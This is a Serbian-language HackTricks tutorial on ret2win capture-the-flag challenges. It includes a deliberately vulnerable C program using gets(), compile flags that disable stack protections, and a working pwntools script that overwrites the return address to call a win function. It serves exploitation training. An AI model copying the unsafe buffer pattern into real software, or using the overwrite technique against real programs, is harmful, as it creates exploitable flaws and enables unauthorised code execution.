# Ret2win

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne Informacije

**Ret2win** izazovi su popularna kategorija u takmičenjima **Capture The Flag (CTF)**, posebno u zadacima koji uključuju **binarno eksploatisanje**. Cilj je iskoristiti ranjivost u datom binarnom fajlu kako bi se izvršila određena, neizvršena funkcija unutar binarnog fajla, često nazvana nešto poput `win`, `flag`, itd. Ova funkcija, kada se izvrši, obično ispisuje zastavu ili poruku o uspehu. Izazov obično uključuje prepisivanje **adrese povratka** na steku kako bi se preusmerio tok izvršavanja ka željenoj funkciji. Evo detaljnijeg objašnjenja sa primerima:

### Primer u C-u

Razmotrimo jednostavan C program sa ranjivošću i `win` funkcijom koju nameravamo pozvati:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Da biste kompajlirali ovaj program bez zaštite steka i sa **ASLR** onemogućenim, možete koristiti sledeću komandu:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-m32`: Kompajlirajte program kao 32-bitni binarni fajl (ovo je opcionalno ali često se koristi u CTF izazovima).
* `-fno-stack-protector`: Onemogućava zaštitu od preplavljivanja steka.
* `-z execstack`: Dozvoljava izvršavanje koda na steku.
* `-no-pie`: Onemogućava izvršavanje poziciono nezavisnog izvršnog fajla kako bi se osiguralo da adresa funkcije `win` ostane nepromenjena.
* `-o vulnerable`: Imenujte izlazni fajl kao `vulnerable`.

### Python Eksploatacija korišćenjem Pwntools

Za eksploataciju, koristićemo **pwntools**, moćan CTF okvir za pisanje eksploata. Skripta za eksploataciju će kreirati payload kako bi preplavila bafer i prepisala povratnu adresu sa adresom funkcije `win`.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
Da biste pronašli adresu funkcije `win`, možete koristiti **gdb**, **objdump**, ili bilo koji drugi alat koji vam omogućava da pregledate binarne datoteke. Na primer, sa `objdump`, možete koristiti:
```sh
objdump -d vulnerable | grep win
```
Ova komanda će vam prikazati sklop `win` funkcije, uključujući njenu početnu adresu.

Python skripta šalje pažljivo oblikovanu poruku koja, kada je obrađena od strane `vulnerable_function`, preplavljuje bafer i prepisuje adresu povratka na steku adresom `win`. Kada se `vulnerable_function` vrati, umesto vraćanja na `main` ili izlaska, prelazi na `win`, i poruka se ispisuje.

## Zaštite

* **PIE** treba biti onemogućen da bi adresa bila pouzdana tokom izvršavanja ili adresa na kojoj će funkcija biti smeštena neće uvek biti ista i trebalo bi da imate neki "leak" kako biste saznali gde je `win` funkcija učitana. U nekim slučajevima, kada funkcija koja uzrokuje preplavljivanje je `read` ili slična, možete izvršiti **Delimično prepisivanje** od 1 ili 2 bajta da biste promenili adresu povratka da bude `win` funkcija. Zbog toga kako ASLR funkcioniše, poslednje tri heksadecimalne cifre nisu nasumične, tako da postoji **1/16 šansa** (1 heksadecimalna cifra) da dobijete ispravnu adresu povratka.
* **Stack Canaries** takođe treba da budu onemogućeni ili kompromitovana EIP adresa povratka nikada neće biti praćena.

## Ostali primeri & Reference

* [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
* [https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html](https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html)
* 32 bit, bez ASLR-a
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html)
* 64 bita sa ASLR-om, sa "leak"-om bin adrese
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html)
* 64 bita, bez ASLR-a
* [https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html)
* 32 bita, bez ASLR-a, duplo malo preplavljivanje, prvo da preplavi stek i poveća veličinu drugog preplavljivanja
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32 bita, relro, bez canary-a, nx, bez PIE-a, formatiranje stringa za prepisivanje adrese `fflush` sa `win` funkcijom (ret2win)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html)
* 32 bita, nx, ništa drugo, delimično prepisivanje EIP-a (1 bajt) da pozove `win` funkciju
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html)
* 32 bita, nx, ništa drugo, delimično prepisivanje EIP-a (1 bajt) da pozove `win` funkciju
* [https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html](https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html)
* Program samo validira poslednji bajt broja kako bi proverio veličinu unosa, stoga je moguće dodati bilo koju veličinu sve dok je poslednji bajt unutar dozvoljenog opsega. Zatim, unos stvara preplavljivanje bafera koje se eksploatiše sa ret2win.
* [https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/](https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/)
* 64 bita, relro, bez canary-a, nx, PIE. Delimično prepisivanje da pozove `win` funkciju (ret2win)
